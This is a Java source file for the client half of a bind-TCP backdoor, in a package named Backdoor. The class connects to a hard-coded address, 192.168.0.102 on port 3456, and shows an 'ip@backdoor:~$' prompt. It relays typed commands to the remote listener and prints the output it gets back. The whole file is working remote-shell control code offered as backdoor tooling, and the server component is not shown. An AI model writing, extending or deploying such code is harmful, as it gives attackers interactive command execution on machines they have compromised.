package com.company.Backdoor.BindTCP;

import com.company.Backdoor.BackdoorConstants;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Scanner;

public class BindTCPClient
{
    private int port;
    private String ip;
    private Socket socket;
    private BufferedReader reader;
    private PrintWriter writer;
    private Scanner scanner;

    public BindTCPClient(int port, String ip)
    {
        try
        {
            this.ip = ip;
            this.port = port;
            socket = new Socket(ip, port);
            reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            writer = new PrintWriter(socket.getOutputStream());
            System.out.println("Connected to Server");
            scanner = new Scanner(System.in);
        }
        catch (UnknownHostException e) {
            e.printStackTrace();
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }




    private void connectServer()
    {
        try
        {
            while (!socket.isClosed())
            {
                System.out.print(BackdoorConstants.GREEN + ip + "@backdoor:~$ "+BackdoorConstants.RESET);
                String command = scanner.nextLine();
                writer.println(command);
                writer.flush();
                if (command.equals("exit"))
                    break;
                writeResponse();

            }
            System.out.println("Socket closed");
            socket.close();
        }
        catch (IOException e) {
            e.printStackTrace();
        }

    }
    private void writeResponse() throws IOException {
        String line;
        while ((line = reader.readLine()) != null)
        {
            if (line.endsWith(BackdoorConstants.END_OF_COMMAND))
                break;
            System.out.println(line);
        }
    }
    public static void main(String[] args)
    {
        BindTCPClient client = new BindTCPClient(3456,"192.168.0.102");
        client.connectServer();
    }

}
